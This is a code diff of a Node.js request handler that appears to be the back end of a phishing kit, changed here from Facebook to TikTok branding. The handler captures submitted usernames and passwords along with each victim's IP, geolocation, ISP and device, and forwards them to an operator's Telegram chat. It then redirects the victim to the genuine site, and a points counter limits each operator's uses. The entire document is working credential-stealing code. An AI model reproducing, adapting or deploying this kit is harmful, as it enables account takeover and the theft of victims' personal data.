@@ -18,7 +18,7 @@ module.exports = async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });
 
-  // ✅ Step 1: Check points from Redis
+  // ✅ Step 1: Check points
   let points = await redis.get(uid);
   if (!points) {
     points = 5;
@@ -30,7 +30,7 @@ module.exports = async (req, res) => {
     return res.status(403).send("❌ No more points");
   }
 
-  // 🌐 Step 2: Get location
+  // 🌍 Step 2: Geo info
   let geo = {};
   try {
     geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
@@ -38,35 +38,33 @@ module.exports = async (req, res) => {
     geo = {};
   }
 
-  // ✉️ Step 3: Compose message
+  // ✉️ Step 3: Compose TikTok message
   const message = `
-╭───🔘 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 𝗦𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱 ✅ ───╮
+╭───🎵 𝗧𝗶𝗸𝗧𝗼𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 ✅ ────────╮
 ├ 👤 Username: ${username}
 ├ 🔐 Password: ${password}
 ├ 🆔 ID: ${uid}
-├ 📆 Time: ${timestamp}
+├ ⏰ Time: ${timestamp}
 ├ 🌐 IP: ${ip}
-├ 🏙️ City: ${geo.city || 'Kabul'}
-├ 🌍 Country: Afghanistan
+├ 🏙️ City: ${geo.city || 'Unknown'}
+├ 🌍 Country: ${geo.country || 'Afghanistan'}
 ├ 🛰️ ISP: ${geo.isp || 'Unknown'}
 ├ 📱 Device: ${userAgent}
-╰━━━━━━━━━━━━━━━━━━━━━━╯
+╰──────────────────────────────╯
 
-✅ د معلوماتو لیږنه بریالۍ ده.
+🎯 معلومات په بریالیتوب سره ترلاسه شول.
 
-╭─────── 🚀 Root Access Panel 💠 ───────╮
-│ 🧑🏻‍💻 Built By: 💛 WACIQ 
-╰───────────────────────────────────────╯ 
+╭───── 🔥 TikTok Bot Panel ─────╮
+│ 🛠️ Developed By: @WACIQ
+╰──────────────────────────────╯
 `;
 
   try {
-    // 📤 Step 4: Send to Telegram
     await bot.telegram.sendMessage(uid, message);
 
-    // ➖ Step 5: Deduct point
-    await redis.decr(uid);
+    await redis.decr(uid); // -1 point
 
-    return res.redirect('https://instagram.com'); // redirect URL دلته بدلولای شې
+    return res.redirect('https://tiktok.com'); // TikTok ته redirect
   } catch (e) {
     console.error("Telegram Error:", e.message);
     return res.status(500).send("❌ Failed to send message.");
